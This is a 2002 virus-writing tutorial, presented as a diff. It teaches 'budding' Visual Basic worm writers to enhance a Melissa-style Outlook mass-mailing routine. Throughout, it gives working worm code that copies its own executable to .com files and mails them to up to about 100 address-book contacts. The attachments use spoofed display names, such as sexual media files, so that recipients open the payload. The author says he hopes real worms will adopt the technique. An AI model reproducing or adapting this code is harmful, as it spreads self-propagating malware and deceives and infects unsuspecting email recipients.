@@ -1,0 +1,254 @@
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+						two vital tricks in ms outlook
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------
+
+here i am again, writing this piece of new work which aims to give you, budding
+visual basic worm writers, new knowledge... yeah, haven't seen a worm with multiple
+attachments (except for my worms, w32.alcarys and w32.alcarys.b of course) and
+a worm which can spoof hide attachment names in outlook (again except for my worms, 
+w32.alcarys and w32.alcarys.b of course)... so kids, now it's
+high time to share to you a secret...
+
+here's a piece of code which melissa used to become notorious...
+
+-----------------------------------------------
+sub massmail()
+on error resume next
+dim a, b, d, c, e, y, x, oo
+Set a = CreateObject("Outlook.Application")
+Set b = a.GetNameSpace("MAPI")
+If a = "Outlook" Then
+b.Logon "profile", "password"
+For y = 1 To b.AddressLists.Count
+Set d = b.AddressLists(y)
+x = 1
+Set c = a.CreateItem(0)
+For oo = 1 To d.AddressEntries.Count
+e = d.AddressEntries(x)
+c.Recipients.Add e
+x = x + 1
+If x > 101 Then oo = d.AddressEntries.Count
+Next oo
+c.Subject = "your subject"
+c.Body = "your message"
+c.attachments.Add "c:\yourattachment.ext"
+c.Send
+e = ""
+Next y
+b.Logoff
+End If
+end sub
+------------------------------------------------
+
+i assume vicodines, who conceptualized the mass mailing routine, didn't see the possibility that
+this code can be enhanced... maybe he got some reasons to just putting the attachment
+name as is and traversed the road to notoriety...
+
+as a creative vb worm writer, we must employ new things to the code... innovation at its finest..
+
+objectives : enhance the code to be able for it to handle multiple attachments and spoofing of attachment names..
+
+lets run ms outlook help files....
+
+---------------------------------------------------
+Add Method (Attachments Collection)
+                
+
+Creates a new attachment in the Attachments collection, and returns the new attachment 
+as an Attachment object.
+
+Syntax
+
+objAttachments.Add(Source, [Type], [Position], [DisplayName])
+
+objAttachments   Required. An expression that returns an Attachments collection object.
+
+Source   Required Variant. The file (represented by the full path and file name) or item 
+	that constitutes the attachment.
+
+Type   Optional Long. The type of attachment. Can be one of the following OlAttachmentType 
+	constants: olByReference(4), olByValue(1), or olEmbeddedItem(5).
+
+Position   Optional Long. The position of the attachment within the body text of the message.
+
+DisplayName   Optional String. The display name of the attachment. Ignored unless Type is set to olByValue.
+
+Remarks
+
+The following table describes the purpose of each OlAttachmentType constant value.
+
+Constant 		Use to 
+olByReference 		Create a shortcut to an external file 
+olByValue 		Embed attachment in the item 
+olEmbeddedItem 		Create a shortcut to an Outlook item 
+
+
+When an Attachment is added to the Attachments collection of an item, the Type property of the Attachment 
+will always return olOLE(6) until the item is saved.
+
+To ensure consistent results, always save an item before adding or removing objects in the Attachments collection 
+of the item.
+---------------------------------------------------
+
+so it has been written, so it shall be done...
+
+-----------------
+coding exercise
+-----------------
+
+mission one : spoofing of attachment names in ms outlook
+
+-----------------------------------------------
+sub main()
+on error resume next
+dim a, b, d, c, e, y, x, oo, ph, ph1
+ph = app.path & "\" & app.exename & ".com"
+ph1 = app.path & app.exename & ".com"
+filecopy ph1, "c:\alco.com"
+filecopy ph, "c:\alco.com
+Set a = CreateObject("Outlook.Application")
+Set b = a.GetNameSpace("MAPI")
+If a = "Outlook" Then
+b.Logon "profile", "password"
+For y = 1 To b.AddressLists.Count
+Set d = b.AddressLists(y)
+x = 1
+Set c = a.CreateItem(0)
+For oo = 1 To d.AddressEntries.Count
+e = d.AddressEntries(x)
+c.Recipients.Add e
+x = x + 1
+If x > 101 Then oo = d.AddressEntries.Count
+Next oo
+c.Subject = "hello"
+c.Body = "this is a worm which can spoof attachments..."
+c.attachments.Add "c:\alco.com", 1, 1, "xxxmovie.mpg"
+c.Send
+e = ""
+Next y
+b.Logoff
+End If
+end sub
+------------------------------------------------
+
+c.attachments.Add "c:\alco.com", 1, 1, "xxxmovie.mpg" means that we'll attach c:\alco.com,
+embed it in the outlook message, position it in the first part of the message and display it in the message 
+as xxxmovie.mpg...nice? yeah... but if you'll examine the message, you can see this..
+
+---ms outlook--
+---------------
+message body
+---------------
+[xxxmovie.mpg]his is a worm which can spoof attachments...
+
+
+the first letter of the message is overwritten by the attachment... so the solution, any character which we'll
+like to be overwritten by the attachment.. i.e. a dot... let's put the dot in the first part of the message..
+
+----------------------------------
+....
+If x > 101 Then oo = d.AddressEntries.Count
+Next oo
+c.Subject = "hello"
+c.Body = ".this is a worm which can spoof attachments..."
+c.attachments.Add "c:\alco.com", 1, 1, "xxxmovie.mpg"
+c.Send
+e = ""
+Next y
+b.Logoff
+....
+----------------------------------
+
+running it again will produce this...
+
+---ms outlook--
+---------------
+message body
+---------------
+[xxxmovie.mpg]this is a worm which can spoof attachments...
+
+so we're through... this technique will be vital when we go through the multiple attachment technique...
+
+mission 2 : multiple attachments
+
+why multiple attachments? for example, in a raffle draw, the more entries, the more chances of winning..
+so the more attachment choices, the more likely for a user to click one among the attachments... take a probability
+lecture for more enlightenment....
+
+-----------------------------------------------
+sub main()
+on error resume next
+dim a, b, d, c, e, y, x, oo, ph, ph1, num, arrr, attch
+ph = app.path & "\" & app.exename & ".com"
+ph1 = app.path & app.exename & ".com"
+For num = 0 To 3
+arrr = Array("c:\alco.com", "c:\paul.com", "c:\is.com", "c:\lame.com")
+attch = arrr(num)
+FileCopy ph, attch
+FileCopy ph1, attch
+Next num
+Set a = CreateObject("Outlook.Application")
+Set b = a.GetNameSpace("MAPI")
+If a = "Outlook" Then
+b.Logon "profile", "password"
+For y = 1 To b.AddressLists.Count
+Set d = b.AddressLists(y)
+x = 1
+Set c = a.CreateItem(0)
+For oo = 1 To d.AddressEntries.Count
+e = d.AddressEntries(x)
+c.Recipients.Add e
+x = x + 1
+If x > 101 Then oo = d.AddressEntries.Count
+Next oo
+c.Subject = "hello"
+c.Body = "....this is a worm which can spoof attachments and add multiple attachments..."
+c.attachments.Add "c:\alco.com", 1, 1, "xxxmovie.mpg"
+c.attachments.Add "c:\paul.com", 1, 2, "xxxmoans.wav"
+c.attachments.Add "c:\is.com", 1, 3, "pussy.jpg"
+c.attachments.Add "c:\lame.com", 1, 4, "script.txt"
+c.Send
+e = ""
+Next y
+b.Logoff
+End If
+end sub
+------------------------------------------------
+
+first take a look at the message body... four dots are added coz these dots will be overwritten by the attachments..
+
+--------------------------------------------------
+.......
+c.attachments.Add "c:\alco.com", 1, 1, "xxxmovie.mpg" ---get file, embed, first position, display as xxxmovie.mpg 
+c.attachments.Add "c:\paul.com", 1, 2, "xxxmoans.wav" ---get file, embed, second position, display as xxxmoans.wav
+c.attachments.Add "c:\is.com", 1, 3, "pussy.jpg" ---- get file, embed, third position, display as pussy.jpg
+c.attachments.Add "c:\lame.com", 1, 4, "script.txt" ---get file, embed, fourth position, display as script.txt
+.......
+--------------------------------------------------
+
+taking a look at outlook
+
+---ms outlook--
+---------------
+message body
+---------------
+[xxxmovie.mpg][xxxmoans.wav][pussy.jpg][script.txt]this is a worm which can spoof attachments and add multiple 
+attachments...
+
+
+phuck! i'm through...
+
+i wish i did some kinda help to you, budding vb coders.... i hope that one day, when i look at some av sites, i can find
+a worm or worms that employ this technique and in a way, i can assure myself that this tutorial is a success....
+
+
+alcopaul
+02/28/2002
+
+
